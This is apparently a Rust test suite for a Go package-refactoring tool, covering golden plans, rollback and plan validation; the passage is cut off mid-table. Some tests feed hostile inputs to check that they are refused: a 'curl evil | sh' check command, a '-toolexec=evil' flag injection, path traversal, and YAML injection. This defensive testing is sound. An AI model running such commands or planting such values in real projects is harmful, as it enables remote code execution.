//! Golden-file harness: `testdata/refactor/<operation>/<case>/{op.json, plan.json, after.txt}`
//! with the pre-apply tree in `testdata/refactor/_inputs/<op.json "input">/`.
//! `KIBITZER_BLESS=1 cargo test go_refactor::golden` rewrites the expected files; review the diff.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicUsize, Ordering};

use serde_json::Value;

use super::atomic_apply::{ApplyOptions, apply, apply_with};
use super::plan::sha256_hex;
use super::types::{ApplyStatus, MovePlan, PlanStepKind};
use super::*;

fn data_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/refactor")
}

static COUNTER: AtomicUsize = AtomicUsize::new(0);

fn temp_dir(tag: &str) -> PathBuf {
    let d = std::env::temp_dir().join(format!(
        "kibitzer-refactor-{}-{}-{tag}",
        std::process::id(),
        COUNTER.fetch_add(1, Ordering::SeqCst)
    ));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn copy_dir(src: &Path, dst: &Path) {
    std::fs::create_dir_all(dst).unwrap();
    for e in std::fs::read_dir(src).unwrap() {
        let e = e.unwrap();
        let to = dst.join(e.file_name());
        if e.file_type().unwrap().is_dir() {
            copy_dir(&e.path(), &to);
        } else {
            std::fs::copy(e.path(), to).unwrap();
        }
    }
}

fn input_copy(name: &str) -> PathBuf {
    let d = temp_dir(name);
    copy_dir(&data_root().join("_inputs").join(name), &d);
    d
}

fn checksums(root: &Path) -> BTreeMap<String, String> {
    fn walk(root: &Path, dir: &Path, out: &mut BTreeMap<String, String>) {
        for e in std::fs::read_dir(dir).unwrap() {
            let e = e.unwrap();
            if e.file_type().unwrap().is_symlink() {
                continue;
            }
            if e.file_type().unwrap().is_dir() {
                walk(root, &e.path(), out);
            } else {
                let rel = e
                    .path()
                    .strip_prefix(root)
                    .unwrap()
                    .to_string_lossy()
                    .replace('\\', "/");
                out.insert(rel, sha256_hex(&std::fs::read(e.path()).unwrap()));
            }
        }
    }
    let mut out = BTreeMap::new();
    walk(root, root, &mut out);
    out
}

fn snapshot(root: &Path) -> String {
    checksums(root)
        .keys()
        .map(|rel| {
            format!(
                "=== {rel} ===\n{}\n",
                std::fs::read_to_string(root.join(rel)).unwrap()
            )
        })
        .collect()
}

fn strs(v: &Value) -> Vec<String> {
    v.as_array()
        .unwrap()
        .iter()
        .map(|x| x.as_str().unwrap().to_string())
        .collect()
}

fn run_plan(root: &Path, op: &Value) -> MovePlan {
    let sim = op.get("simulation").cloned();
    let s = |k: &str| op[k].as_str().unwrap().to_string();
    match op["operation"].as_str().unwrap() {
        "move_files" => plan_move_files(root, &strs(&op["src"]), &s("dest_pkg"), sim).unwrap(),
        "rename_pkg" => {
            plan_rename_pkg(root, &s("from"), &s("to"), op["name"].as_str(), sim).unwrap()
        }
        "extract_decls" => {
            plan_extract_decls(root, &s("from"), &strs(&op["decls"]), &s("to"), sim).unwrap()
        }
        "split_pkg" => {
            let clusters: Vec<(String, Vec<String>)> = op["clusters"]
                .as_array()
                .unwrap()
                .iter()
                .map(|c| (c["to"].as_str().unwrap().to_string(), strs(&c["files"])))
                .collect();
            plan_split_pkg(root, &s("pkg"), &clusters, sim).unwrap()
        }
        "sync_policy" => plan_sync_policy(root, &run_plan(root, &op["source"])).unwrap(),
        other => panic!("unknown operation {other}"),
    }
}

/// Whether the Go toolchain can be used to verify applied trees. Under CI (or
/// `KIBITZER_REQUIRE_GO`) a missing toolchain is a failure: otherwise every apply below would
/// silently skip `go build/vet/test`, the only independent check that the rewritten Go compiles.
fn go_available() -> bool {
    let ok = std::process::Command::new("go")
        .arg("version")
        .output()
        .is_ok_and(|o| o.status.success());
    if !ok
        && (std::env::var_os("CI").is_some() || std::env::var_os("KIBITZER_REQUIRE_GO").is_some())
    {
        panic!(
            "the Go toolchain is required here (CI or KIBITZER_REQUIRE_GO is set) but `go version` failed"
        );
    }
    ok
}

/// Applied golden cases whose result was checked by `go build/vet/test` (see `golden_cases`).
static APPLIED_WITH_GO: AtomicUsize = AtomicUsize::new(0);
static APPLIED_GO_PLANS: AtomicUsize = AtomicUsize::new(0);

fn run_case(case_dir: &Path) {
    let op: Value =
        serde_json::from_str(&std::fs::read_to_string(case_dir.join("op.json")).unwrap()).unwrap();
    let name = case_dir
        .strip_prefix(data_root())
        .unwrap()
        .display()
        .to_string();
    let bless = std::env::var_os("KIBITZER_BLESS").is_some();
    let root = input_copy(op["input"].as_str().unwrap());
    let before = checksums(&root);

    let mut plan = run_plan(&root, &op);
    assert_eq!(
        checksums(&root),
        before,
        "{name}: planning must not touch the tree"
    );
    plan.repo_root = "<repo>".into();
    let plan_json = format!("{}\n", serde_json::to_string_pretty(&plan).unwrap());
    let expected_path = case_dir.join("plan.json");
    if bless {
        std::fs::write(&expected_path, &plan_json).unwrap();
    }
    let expected = std::fs::read_to_string(&expected_path)
        .unwrap_or_else(|_| panic!("{name}: missing plan.json (run with KIBITZER_BLESS=1)"));
    assert_eq!(plan_json, expected, "{name}: plan differs from golden");

    let after_path = case_dir.join("after.txt");
    if !plan.blockers.is_empty() {
        let err =
            apply(&plan, &root, &ApplyOptions::default()).expect_err("blocked plan must not apply");
        assert!(err.to_string().contains("blocker"), "{name}: {err}");
        assert_eq!(
            checksums(&root),
            before,
            "{name}: refused apply must not touch the tree"
        );
        assert!(
            !after_path.exists(),
            "{name}: blocked case must not have after.txt"
        );
    } else {
        let policy_only = plan.operation == types::OperationKind::SyncPolicy;
        let opts = ApplyOptions {
            verify: go_available() && !policy_only,
            ..Default::default()
        };
        let result =
            apply(&plan, &root, &opts).unwrap_or_else(|e| panic!("{name}: apply failed: {e:#}"));
        assert_eq!(result.status, ApplyStatus::Applied, "{name}");
        if !policy_only {
            APPLIED_GO_PLANS.fetch_add(1, Ordering::SeqCst);
            if result.verify.is_some() {
                APPLIED_WITH_GO.fetch_add(1, Ordering::SeqCst);
            }
        }
        if let Some(v) = &result.verify {
            assert!(
                v.ok(),
                "{name}: verification failed:\n{}\n{}\n{}",
                v.build.output,
                v.vet.output,
                v.test.output
            );
        }
        let tree = snapshot(&root);
        if bless {
            std::fs::write(&after_path, &tree).unwrap();
        }
        assert_eq!(
            tree,
            std::fs::read_to_string(&after_path).unwrap_or_default(),
            "{name}: after-tree differs from golden"
        );
        // Idempotence: the second apply is a no-op, not a mutation.
        let again = apply(&plan, &root, &opts)
            .unwrap_or_else(|e| panic!("{name}: second apply errored: {e:#}"));
        assert_eq!(again.status, ApplyStatus::AlreadyApplied, "{name}");
        assert_eq!(
            snapshot(&root),
            tree,
            "{name}: second apply changed the tree"
        );
    }
    // Opt-in: set the KIBITZER_KEEP_TREES env var to a directory to keep each applied tree for running the Go toolchain on them directly.
    if let Some(keep) = std::env::var_os("KIBITZER_KEEP_TREES")
        && plan.blockers.is_empty()
    {
        let dest = PathBuf::from(keep).join(name.replace('/', "__"));
        let _ = std::fs::remove_dir_all(&dest);
        copy_dir(&root, &dest);
    }
    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn golden_cases() {
    let mut cases = vec![];
    for op in std::fs::read_dir(data_root()).unwrap() {
        let op = op.unwrap().path();
        if !op.is_dir() || op.file_name().unwrap().to_string_lossy().starts_with('_') {
            continue;
        }
        for c in std::fs::read_dir(&op).unwrap() {
            let c = c.unwrap().path();
            if c.join("op.json").exists() {
                cases.push(c);
            }
        }
    }
    cases.sort();
    assert!(
        cases.len() >= 25,
        "expected the full fixture matrix, found {}",
        cases.len()
    );
    APPLIED_WITH_GO.store(0, Ordering::SeqCst);
    APPLIED_GO_PLANS.store(0, Ordering::SeqCst);
    for c in cases {
        run_case(&c);
    }
    // Proof the verification path ran: every applied Go-changing case went through
    // go build/vet/test (not merely "no failure was observed").
    let (applied, verified) = (
        APPLIED_GO_PLANS.load(Ordering::SeqCst),
        APPLIED_WITH_GO.load(Ordering::SeqCst),
    );
    assert!(
        applied >= 9,
        "expected the applied golden cases, saw {applied}"
    );
    if go_available() {
        assert_eq!(
            verified, applied,
            "{applied} golden cases applied but only {verified} were verified with go"
        );
    }
    eprintln!("golden: {applied} applied cases, {verified} verified with go build/vet/test");
}

/// Every operation must have the five AC-1 shapes.
#[test]
fn every_operation_covers_the_required_shapes() {
    for op in [
        "move-files",
        "rename-pkg",
        "extract-decls",
        "split-pkg",
        "sync-policy",
    ] {
        for case in [
            "clean",
            "test-package",
            "internal-boundary",
            "cycle-rejection",
            "simulator-negative",
        ] {
            assert!(
                data_root().join(op).join(case).join("op.json").exists(),
                "missing fixture {op}/{case}"
            );
        }
    }
}

/// Re-plans the fixture (not the blessed plan.json), so the assertion tests the code.
fn blocker_codes(case: &str) -> Vec<String> {
    let dir = data_root().join(case);
    let op: Value =
        serde_json::from_str(&std::fs::read_to_string(dir.join("op.json")).unwrap()).unwrap();
    let root = input_copy(op["input"].as_str().unwrap());
    let codes = run_plan(&root, &op)
        .blockers
        .into_iter()
        .map(|b| b.code)
        .collect();
    let _ = std::fs::remove_dir_all(&root);
    codes
}

#[test]
fn negative_fixtures_report_the_expected_blocker() {
    for op in [
        "move-files",
        "rename-pkg",
        "extract-decls",
        "split-pkg",
        "sync-policy",
    ] {
        assert!(
            blocker_codes(&format!("{op}/cycle-rejection")).contains(&"cycle_detected".to_string()),
            "{op}"
        );
        assert!(
            blocker_codes(&format!("{op}/simulator-negative"))
                .contains(&"simulation_blocker".to_string()),
            "{op}"
        );
        // rename's internal fixture and the others all surface the boundary violation
        assert!(
            blocker_codes(&format!("{op}/internal-boundary"))
                .contains(&"internal_visibility".to_string()),
            "{op}"
        );
    }
    assert!(
        blocker_codes("move-files/symbol-conflict-external-test")
            .contains(&"symbol_conflict_external_test".to_string())
    );
    assert!(
        blocker_codes("extract-decls/symbol-conflict-external-test")
            .contains(&"symbol_conflict_external_test".to_string())
    );
    for (case, code) in [
        ("move-files/hazard-build-tag", "build_constraint"),
        (
            "move-files/hazard-build-tag-license-header",
            "build_constraint",
        ),
        ("move-files/hazard-cgo", "cgo"),
        ("move-files/hazard-generated", "generated_file"),
        ("move-files/hazard-init-registration", "init_registration"),
        ("move-files/hazard-symbol-name-string", "import_path_string"),
        (
            "move-files/hazard-path-keyed-registration",
            "path_keyed_registration",
        ),
        // An importer whose import group cannot be edited safely: a blocker, never a silent skip.
        ("extract-decls/unsafe-import-splice", "unsafe_import_edit"),
        ("rename-pkg/hazard-dynamic-reference", "import_path_string"),
        (
            "rename-pkg/hazard-dynamic-reference",
            "path_keyed_registration",
        ),
    ] {
        assert!(blocker_codes(case).contains(&code.to_string()), "{case}");
    }
}

// ---------------------------------------------------------------------------------------
// Atomicity, idempotence, verification
// ---------------------------------------------------------------------------------------

fn base_move_plan(root: &Path) -> MovePlan {
    plan_move_files(
        root,
        &["lib/util.go".into(), "lib/util_test.go".into()],
        "example.com/m/util",
        None,
    )
    .unwrap()
}

/// Applies `plan` but fails the `n`th file write (rename) with an I/O error.
fn apply_failing_write(
    plan: &MovePlan,
    root: &Path,
    n: usize,
) -> anyhow::Result<types::ApplyResult> {
    let seen = AtomicUsize::new(0);
    let rename = |from: &Path, to: &Path| {
        if seen.fetch_add(1, Ordering::SeqCst) == n {
            return Err(std::io::Error::other("injected rename failure"));
        }
        std::fs::rename(from, to)
    };
    apply_with(plan, root, &ApplyOptions::default(), &rename)
}

fn write_count(plan: &MovePlan) -> usize {
    plan.steps
        .iter()
        .filter(|s| s.transform.new_content.is_some())
        .count()
}

#[test]
fn failure_at_every_write_restores_the_tree_byte_for_byte() {
    let root = input_copy("base");
    let plan = base_move_plan(&root);
    let kinds: Vec<PlanStepKind> = plan.steps.iter().map(|s| s.kind).collect();
    assert!(kinds.contains(&PlanStepKind::RewriteFile) && kinds.contains(&PlanStepKind::MoveFile));
    let before = checksums(&root);
    assert!(
        write_count(&plan) >= 3,
        "need several writes to fail between"
    );
    for n in 0..write_count(&plan) {
        let err = apply_failing_write(&plan, &root, n).expect_err("injected failure must surface");
        assert!(format!("{err:#}").contains("rolled back"), "{err:#}");
        assert_eq!(
            checksums(&root),
            before,
            "tree changed after failure at write {n}"
        );
        assert!(
            !root.join(".kibitzer/plans").exists(),
            "log directory left behind after failure at write {n}"
        );
    }
    // …and a clean apply still works afterwards (no leftover temp files or dirs in the way).
    let ok = apply(&plan, &root, &ApplyOptions::default()).unwrap();
    assert_eq!(ok.status, ApplyStatus::Applied);
    assert!(
        !root.join(".kibitzer/plans").exists(),
        "log directory left behind after success"
    );
}

#[test]
fn policy_update_failure_restores_the_tree() {
    let root = input_copy("base");
    let source =
        plan_rename_pkg(&root, "example.com/m/lib", "example.com/m/core", None, None).unwrap();
    let policy = plan_sync_policy(&root, &source).unwrap();
    assert!(
        policy
            .steps
            .iter()
            .all(|s| s.kind == PlanStepKind::PolicyUpdate)
            && !policy.steps.is_empty()
    );
    let before = checksums(&root);
    apply_failing_write(&policy, &root, 0).unwrap_err();
    assert_eq!(checksums(&root), before);
}

#[test]
fn real_write_failure_mid_apply_restores_earlier_writes() {
    let root = input_copy("base");
    let plan = base_move_plan(&root);
    // A regular file where the destination directory must go makes the last writes fail
    // after earlier rewrites already landed.
    std::fs::write(root.join("util"), "not a directory").unwrap();
    let before = checksums(&root);
    apply(&plan, &root, &ApplyOptions::default()).unwrap_err();
    assert_eq!(checksums(&root), before);
}

#[test]
fn stale_or_partial_plan_is_a_clear_error_without_mutation() {
    let root = input_copy("base");
    let plan = base_move_plan(&root);
    // Stale: an importer changed after planning.
    std::fs::write(root.join("app/app.go"), "package app\n\nfunc Run() {}\n").unwrap();
    let before = checksums(&root);
    let err = apply(&plan, &root, &ApplyOptions::default()).unwrap_err();
    assert!(
        err.to_string().contains("stale plan") && err.to_string().contains("nothing was modified"),
        "{err}"
    );
    assert_eq!(checksums(&root), before);

    // Partially applied: one step's target state already present, the rest not.
    let root = input_copy("base");
    let plan = base_move_plan(&root);
    let first = &plan.steps[0].transform;
    std::fs::write(
        root.join(first.new_path.as_ref().unwrap()),
        first.new_content.as_ref().unwrap(),
    )
    .unwrap();
    let before = checksums(&root);
    let err = apply(&plan, &root, &ApplyOptions::default()).unwrap_err();
    assert!(err.to_string().contains("partially applied"), "{err}");
    assert_eq!(checksums(&root), before);
}

#[test]
fn failed_verification_reports_output_verbatim_and_rolls_back() {
    if !go_available() {
        eprintln!("SKIP: no Go toolchain (set KIBITZER_REQUIRE_GO=1 to make this a failure)");
        return;
    }
    let root = input_copy("base");
    let mut plan = base_move_plan(&root);
    // Sabotage the planned content so `go build` must fail.
    let step = plan
        .steps
        .iter_mut()
        .find(|s| s.transform.new_path.as_deref() == Some("app/app.go"))
        .unwrap();
    step.transform.new_content = Some("package app\n\nfunc Run() { undefinedSymbol() }\n".into());
    let plan = plan.sealed();
    let before = checksums(&root);
    let result = apply(
        &plan,
        &root,
        &ApplyOptions {
            verify: true,
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(result.status, ApplyStatus::RolledBack);
    let v = result.verify.unwrap();
    assert!(
        !v.build.ok() && v.build.output.contains("undefinedSymbol"),
        "{}",
        v.build.output
    );
    assert_eq!(v.build.command, "go build ./...");
    assert_eq!(v.vet.command, "go vet ./...");
    assert_eq!(v.test.command, "go test -count=1 ./...");
    assert_eq!(checksums(&root), before);
}

#[test]
fn successful_apply_embeds_all_three_command_outputs() {
    if !go_available() {
        eprintln!("SKIP: no Go toolchain (set KIBITZER_REQUIRE_GO=1 to make this a failure)");
        return;
    }
    let root = input_copy("base");
    let plan = base_move_plan(&root);
    let result = apply(
        &plan,
        &root,
        &ApplyOptions {
            verify: true,
            ..Default::default()
        },
    )
    .unwrap();
    let v = result.verify.unwrap();
    assert!(v.ok());
    assert!(
        v.test.output.contains("example.com/m/util"),
        "{}",
        v.test.output
    );
    assert!(
        v.test.exit_code == Some(0) && v.vet.exit_code == Some(0) && v.build.exit_code == Some(0)
    );
}

#[test]
fn post_apply_hook_failure_rolls_back() {
    if !go_available() {
        eprintln!("SKIP: no Go toolchain (set KIBITZER_REQUIRE_GO=1 to make this a failure)");
        return;
    }
    let root = input_copy("base");
    let plan = base_move_plan(&root);
    let before = checksums(&root);
    let result = apply(
        &plan,
        &root,
        &ApplyOptions {
            verify: true,
            post_apply: Some("echo regen-failed >&2; exit 7".into()),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(result.status, ApplyStatus::RolledBack);
    assert!(
        result
            .verify
            .unwrap()
            .post_apply_hook
            .unwrap()
            .output
            .contains("regen-failed")
    );
    assert_eq!(checksums(&root), before);
}

#[test]
fn simulation_blocker_is_embedded_and_refuses_apply() {
    let root = input_copy("base");
    let sim = serde_json::json!({"feasible": false, "blockers": [{"message": "cycle via pkg x"}]});
    let plan = plan_move_files(
        &root,
        &["lib/util.go".into()],
        "example.com/m/util",
        Some(sim.clone()),
    )
    .unwrap();
    assert_eq!(plan.simulation_result, Some(sim));
    assert!(
        plan.blockers
            .iter()
            .any(|b| b.code == "simulation_blocker" && b.message.contains("cycle via pkg x"))
    );
    apply(&plan, &root, &ApplyOptions::default()).unwrap_err();
}

#[test]
fn rename_handles_tags_generated_and_init_but_blocks_cgo_native_and_embed() {
    let codes =
        |p: &MovePlan| -> Vec<String> { p.blockers.iter().map(|b| b.code.clone()).collect() };
    let rename = |root: &Path| {
        plan_rename_pkg(root, "example.com/m/lib", "example.com/m/core", None, None).unwrap()
    };

    // cgo.go in the package: blocked.
    let root = input_copy("hazards");
    assert_eq!(codes(&rename(&root)), vec!["cgo"]);

    // Without cgo: build-tagged, generated and init() files all move intact.
    std::fs::remove_file(root.join("lib/cgo.go")).unwrap();
    let plan = rename(&root);
    assert!(plan.blockers.is_empty(), "{:?}", plan.blockers);
    assert!(
        plan.warnings
            .iter()
            .any(|w| w.contains("lib/gen.go") && w.contains("generated"))
    );
    let tagged = plan
        .steps
        .iter()
        .find(|s| s.transform.new_path.as_deref() == Some("core/tagged.go"))
        .unwrap();
    assert!(
        tagged
            .transform
            .new_content
            .as_ref()
            .unwrap()
            .starts_with("//go:build linux\n\npackage core")
    );
    let reg = plan
        .steps
        .iter()
        .find(|s| s.transform.new_path.as_deref() == Some("core/reg.go"))
        .unwrap();
    assert!(
        reg.transform
            .new_content
            .as_ref()
            .unwrap()
            .contains("func init()")
    );

    // Native sources and go:embed block even a whole-package rename.
    std::fs::write(root.join("lib/x.c"), "int x;\n").unwrap();
    assert_eq!(codes(&rename(&root)), vec!["native_sources"]);
    std::fs::remove_file(root.join("lib/x.c")).unwrap();
    std::fs::write(
        root.join("lib/emb.go"),
        "package lib\n\nimport _ \"embed\"\n\n//go:embed emb.txt\nvar Emb string\n",
    )
    .unwrap();
    assert_eq!(codes(&rename(&root)), vec!["go_embed"]);
}

#[test]
fn move_into_a_same_named_package_imports_it_under_an_alias() {
    let root = input_copy("samename");
    let plan = plan_move_files(
        &root,
        &["lib/moved.go".into()],
        "example.com/m/sub/lib",
        None,
    )
    .unwrap();
    assert!(plan.blockers.is_empty(), "{:?}", plan.blockers);
    let app = plan
        .steps
        .iter()
        .find(|s| s.transform.new_path.as_deref() == Some("app/main.go"))
        .unwrap();
    let content = app.transform.new_content.as_ref().unwrap();
    assert!(
        content.contains("sublib \"example.com/m/sub/lib\"") && content.contains("sublib.Moved()"),
        "{content}"
    );
    let opts = ApplyOptions {
        verify: go_available(),
        ..Default::default()
    };
    let result = apply(&plan, &root, &opts).unwrap();
    assert_eq!(
        result.status,
        ApplyStatus::Applied,
        "{:?}",
        result.verify.map(|v| v.build.output)
    );
}

#[test]
fn plans_cannot_write_outside_the_repo_or_inject_go_flags() {
    let root = input_copy("base");
    let mut plan = base_move_plan(&root);
    plan.steps[0].transform.new_path = Some("../escape.go".into());
    let plan = plan.sealed();
    let before = checksums(&root);
    assert!(
        apply(&plan, &root, &ApplyOptions::default())
            .unwrap_err()
            .to_string()
            .contains("leaves the repository")
    );
    let mut plan = base_move_plan(&root);
    plan.affected_packages = vec!["-toolexec=evil".into()];
    let plan = plan.sealed();
    assert!(
        apply(&plan, &root, &ApplyOptions::default())
            .unwrap_err()
            .to_string()
            .contains("not a relative package path")
    );
    assert_eq!(checksums(&root), before);
    assert!(!root.parent().unwrap().join("escape.go").exists());
}

#[test]
fn sync_policy_rewrites_guard_configs_for_modules_without_a_dot() {
    let root = input_copy("nodot");
    let source = plan_rename_pkg(&root, "myapp/lib", "myapp/core", None, None).unwrap();
    assert!(source.blockers.is_empty(), "{:?}", source.blockers);
    let policy = plan_sync_policy(&root, &source).unwrap();
    let step = policy
        .steps
        .iter()
        .find(|s| s.transform.new_path.as_deref() == Some(".golangci.yml"))
        .expect("guard step");
    assert!(
        step.transform
            .new_content
            .as_ref()
            .unwrap()
            .contains("\"myapp/core\"")
    );
}

#[test]
fn rename_blocks_when_testdata_would_be_stranded_but_partial_moves_only_warn() {
    let root = input_copy("plain");
    std::fs::create_dir_all(root.join("lib/testdata")).unwrap();
    std::fs::write(root.join("lib/testdata/g.txt"), "x").unwrap();
    let rename =
        plan_rename_pkg(&root, "example.com/m/lib", "example.com/m/core", None, None).unwrap();
    assert!(rename.blockers.iter().any(|b| b.code == "non_go_assets"));
    let mv = plan_move_files(&root, &["lib/util.go".into()], "example.com/m/util", None).unwrap();
    assert!(mv.blockers.is_empty() && mv.warnings.iter().any(|w| w.contains("testdata")));
}

fn scratch(tag: &str, files: &[(&str, &str)]) -> PathBuf {
    let d = temp_dir(tag);
    std::fs::write(d.join("go.mod"), "module example.com/m\n\ngo 1.21\n").unwrap();
    for (path, body) in files {
        let full = d.join(path);
        std::fs::create_dir_all(full.parent().unwrap()).unwrap();
        std::fs::write(full, body).unwrap();
    }
    d
}

fn move_codes(root: &Path, src: &str, dest: &str) -> Vec<String> {
    let before = checksums(root);
    let plan = plan_move_files(root, &[src.into()], dest, None).unwrap();
    assert_eq!(checksums(root), before, "planning must not touch the tree");
    plan.blockers.into_iter().map(|b| b.code).collect()
}

#[test]
fn boundary_crossing_declarations_are_blocked_with_specific_codes() {
    // Receiver type and its method end up in different packages.
    let r = scratch(
        "method-split",
        &[
            ("lib/a.go", "package lib\n\ntype T struct{}\n"),
            ("lib/b.go", "package lib\n\nfunc (T) M() {}\n"),
        ],
    );
    assert!(
        move_codes(&r, "lib/a.go", "example.com/m/other").contains(&"method_split".to_string())
    );

    // A moved name used as a composite-literal key: field or value?
    let r = scratch(
        "ambiguous",
        &[
            ("lib/a.go", "package lib\n\nfunc Moved() int { return 1 }\n"),
            (
                "lib/b.go",
                "package lib\n\ntype S struct{ Moved int }\n\nvar V = S{Moved: 1}\n",
            ),
        ],
    );
    assert!(
        move_codes(&r, "lib/a.go", "example.com/m/other")
            .contains(&"ambiguous_reference".to_string())
    );

    // Moved code depends on an unexported name that stays behind.
    let r = scratch(
        "unexported",
        &[
            (
                "lib/a.go",
                "package lib\n\nfunc Moved() int { return helper() }\n",
            ),
            (
                "lib/b.go",
                "package lib\n\nfunc helper() int { return 1 }\n\nfunc Other() int { return helper() }\n",
            ),
        ],
    );
    assert!(
        move_codes(&r, "lib/a.go", "example.com/m/other")
            .contains(&"unexported_dependency".to_string())
    );

    // The destination already has a file with that name.
    let r = scratch(
        "dest-exists",
        &[
            ("lib/a.go", "package lib\n\nfunc Moved() int { return 1 }\n"),
            ("lib/keep.go", "package lib\n"),
            ("util/a.go", "package util\n\nfunc Other() {}\n"),
        ],
    );
    assert!(
        move_codes(&r, "lib/a.go", "example.com/m/util").contains(&"dest_file_exists".to_string())
    );
}

#[test]
fn import_alias_joins_the_last_two_path_elements() {
    assert_eq!(
        super::ops::import_alias_for_test("example.com/m/sub/lib"),
        "sublib"
    );
    assert_eq!(
        super::ops::import_alias_for_test("example.com/m/a-b/v2"),
        "abv2"
    );
}

#[test]
fn plans_may_only_touch_expected_files_and_never_through_symlinks() {
    let root = input_copy("base");
    let mut plan = base_move_plan(&root);
    plan.steps[0].transform.new_path = Some(".github/workflows/x.yml".into());
    let plan = plan.sealed();
    let err = apply(&plan, &root, &ApplyOptions::default()).unwrap_err();
    assert!(
        err.to_string()
            .contains("not a file this operation may touch"),
        "{err:#}"
    );

    // A non-policy plan cannot carry policy steps (and so cannot skip verification).
    let mut plan = base_move_plan(&root);
    plan.steps[0].kind = PlanStepKind::PolicyUpdate;
    let plan = plan.sealed();
    assert!(
        apply(&plan, &root, &ApplyOptions::default())
            .unwrap_err()
            .to_string()
            .contains("does not belong")
    );

    #[cfg(unix)]
    {
        let outside = temp_dir("outside");
        std::os::unix::fs::symlink(&outside, root.join("esc")).unwrap();
        let mut plan = base_move_plan(&root);
        plan.steps[0].transform.new_path = Some("esc/dropped.go".into());
        let plan = plan.sealed();
        let before = checksums(&root);
        assert!(
            apply(&plan, &root, &ApplyOptions::default())
                .unwrap_err()
                .to_string()
                .contains("symlink")
        );
        assert!(!outside.join("dropped.go").exists());
        assert_eq!(checksums(&root), before);
    }
}

#[cfg(unix)]
#[test]
fn moves_keep_file_permissions() {
    use std::os::unix::fs::PermissionsExt;
    let root = input_copy("base");
    std::fs::set_permissions(
        root.join("lib/util.go"),
        std::fs::Permissions::from_mode(0o600),
    )
    .unwrap();
    let plan = base_move_plan(&root);
    apply(&plan, &root, &ApplyOptions::default()).unwrap();
    let mode = std::fs::metadata(root.join("util/util.go"))
        .unwrap()
        .permissions()
        .mode()
        & 0o777;
    assert_eq!(mode, 0o600);
}

#[test]
fn an_edited_plan_is_rejected_before_anything_is_written() {
    let root = input_copy("base");
    let before = checksums(&root);
    let mut plan = base_move_plan(&root);
    plan.steps[0].transform.new_content = Some("package x\n".into());
    let err = apply(&plan, &root, &ApplyOptions::default()).unwrap_err();
    assert!(
        err.to_string().contains("plan_id does not match"),
        "{err:#}"
    );
    assert_eq!(checksums(&root), before);
}

#[test]
fn a_step_without_old_sha256_is_rejected_even_when_resealed() {
    let root = input_copy("base");
    let mut plan = base_move_plan(&root);
    let step = plan
        .steps
        .iter_mut()
        .find(|s| s.transform.old_path.is_some())
        .unwrap();
    step.transform.old_sha256 = None;
    let err = apply(&plan.sealed(), &root, &ApplyOptions::default()).unwrap_err();
    assert!(err.to_string().contains("old_sha256"), "{err:#}");
}

#[test]
fn a_forged_sync_policy_plan_cannot_plant_check_commands() {
    let root = input_copy("base");
    let source =
        plan_rename_pkg(&root, "example.com/m/lib", "example.com/m/core", None, None).unwrap();
    let mut policy = plan_sync_policy(&root, &source).unwrap();
    let step = policy
        .steps
        .iter_mut()
        .find(|s| s.transform.new_path.as_deref() == Some(".kibitzer/inspect.json"))
        .expect("the base fixture has an inspect.json to rewrite");
    step.transform.new_content =
        Some("{\"checks\":[{\"name\":\"x\",\"command\":\"curl evil | sh\"}]}\n".into());
    let before = checksums(&root);
    let err = apply(&policy.sealed(), &root, &ApplyOptions::default()).unwrap_err();
    assert!(
        err.to_string()
            .contains("differs from what the tool derives"),
        "{err:#}"
    );
    assert_eq!(checksums(&root), before);
}

#[test]
fn path_mappings_that_would_inject_yaml_are_refused() {
    let root = input_copy("base");
    let mut source =
        plan_rename_pkg(&root, "example.com/m/lib", "example.com/m/core", None, None).unwrap();
    source.path_map[0].to = "example.com/m/core\n  evil-key: true".into();
    let err = plan_sync_policy(&root, &source).unwrap_err();
    assert!(err.to_string().contains("not valid in a path"), "{err:#}");
}

// ---------------------------------------------------------------------------------------
// Staleness, plan validation and forged policy plans
// ---------------------------------------------------------------------------------------

#[test]
fn a_move_whose_source_changed_after_planning_is_stale_and_writes_nothing() {
    let root = input_copy("base");
    let plan = base_move_plan(&root);
    std::fs::write(
        root.join("lib/util.go"),
        "package lib\n\n// edited after planning\n",
    )
    .unwrap();
    let before = checksums(&root);
    let err = apply(&plan, &root, &ApplyOptions::default()).unwrap_err();
    assert!(
        err.to_string().contains("changed since the plan was made"),
        "{err:#}"
    );
    assert_eq!(checksums(&root), before);
}

#[cfg(unix)]
#[test]
fn an_unreadable_source_is_a_conflict_not_a_missing_file() {
    let root = input_copy("base");
    let plan = base_move_plan(&root);
    // A directory where the planned file was fails to read with a non-NotFound error, as root too.
    std::fs::remove_file(root.join("app/app.go")).unwrap();
    std::fs::create_dir(root.join("app/app.go")).unwrap();
    let before = checksums(&root);
    let err = apply(&plan, &root, &ApplyOptions::default()).unwrap_err();
    assert!(err.to_string().contains("not readable"), "{err:#}");
    assert_eq!(checksums(&root), before);
}

/// One way to corrupt a plan for the table-driven refusal tests below.
type PlanMutator = Box<dyn Fn(&mut MovePlan)>;

#[test]
fn every_validate_plan_branch_refuses_before_writing() {
    let rows: Vec<(&str, PlanMutator, &str)> = vec![
        (
            "absolute path",
            Box::new(|p| p.steps[0].transform.new_path = Some("/abs.go".into())),
            "leaves the repository",
        ),
        (
            "empty path",
            Box::new(|p| p.steps[0].transform.new_path = Some(String::new())),
            "leaves the repository",
        ),
        (
            "dotdot",
            Box::new(|p| p.steps[0].transform.new_path = Some("a/../../x.go".into())),
            "leaves the repository",
        ),
        (
            "git dir",
            Box::new(|p| p.steps[0].transform.new_path = Some(".git/hooks/x.go".into())),
            "may touch",
        ),
        (
            "hidden dir",
            Box::new(|p| p.steps[0].transform.new_path = Some("a/.h/x.go".into())),
            "may touch",
        ),
        (
            "not go",
            Box::new(|p| p.steps[0].transform.new_path = Some("x.txt".into())),
            "may touch",
        ),
        (
            "pkg dot go",
            Box::new(|p| p.affected_packages = vec!["./a.go".into()]),
            "relative package path",
        ),
        (
            "pkg dotdot",
            Box::new(|p| p.affected_packages = vec!["./../x".into()]),
            "relative package path",
        ),
        (
            "pkg no prefix",
            Box::new(|p| p.affected_packages = vec!["a".into()]),
            "relative package path",
        ),
        (
            "pkg space",
            Box::new(|p| p.affected_packages = vec!["./x y".into()]),
            "relative package path",
        ),
        (
            "pkg flag",
